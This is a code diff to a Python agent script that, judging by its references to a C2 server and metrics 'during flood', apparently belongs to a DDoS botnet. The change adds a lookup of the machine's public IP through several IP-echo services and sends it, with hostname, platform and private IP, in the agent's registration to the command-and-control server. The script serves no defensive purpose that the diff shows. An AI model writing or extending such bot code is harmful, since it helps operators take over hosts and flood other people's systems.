@@ -54,10 +54,10 @@ HOSTNAME  = socket.gethostname()
 PLATFORM  = platform.system() + " " + platform.release()
 
 def _get_real_ip():
-    """Get the real outbound IP (avoids 127.0.1.1 loopback alias on Linux)."""
+    """Get the real outbound private IP (avoids 127.0.1.1 loopback alias on Linux)."""
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect((C2_HOST, C2_PORT))  # connects to C2 — picks correct interface
+        s.connect((C2_HOST, C2_PORT))
         ip = s.getsockname()[0]
         s.close()
         return ip
@@ -66,6 +66,25 @@ def _get_real_ip():
             return socket.gethostbyname(HOSTNAME)
         except Exception:
             return "0.0.0.0"
+
+def _get_public_ip():
+    """Fetch public IP from multiple lookup services (first success wins)."""
+    services = [
+        "https://api.ipify.org",
+        "https://ifconfig.me/ip",
+        "https://icanhazip.com",
+        "https://checkip.amazonaws.com",
+    ]
+    for url in services:
+        try:
+            req = urllib.request.Request(url, headers={"User-Agent": "curl/7.0"})
+            with urllib.request.urlopen(req, timeout=5) as r:
+                ip = r.read().decode().strip()
+                if ip and len(ip) < 46:  # sanity check (max IPv6 length)
+                    return ip
+        except Exception:
+            continue
+    return ""
 
 # ── Live metrics (updated in real-time during flood) ─────────────────────────
 _metrics_lock = threading.Lock()
@@ -320,13 +339,19 @@ def main():
     # Start Prometheus metrics server
     metrics_port = _start_metrics_server()
 
-    # Register with C2 (include metrics port)
+    # Fetch public IP once at startup (non-blocking, best-effort)
+    public_ip = _get_public_ip()
+    if public_ip:
+        print("[agent] Public IP: {}".format(public_ip))
+
+    # Register with C2
     while True:
         r = _post("/api/agent/register", {
             "id":           AGENT_ID,
             "hostname":     HOSTNAME,
             "platform":     PLATFORM,
             "ip":           _get_real_ip(),
+            "public_ip":    public_ip,
             "metrics_port": metrics_port or 0,
         })
         if r.get("ok"):
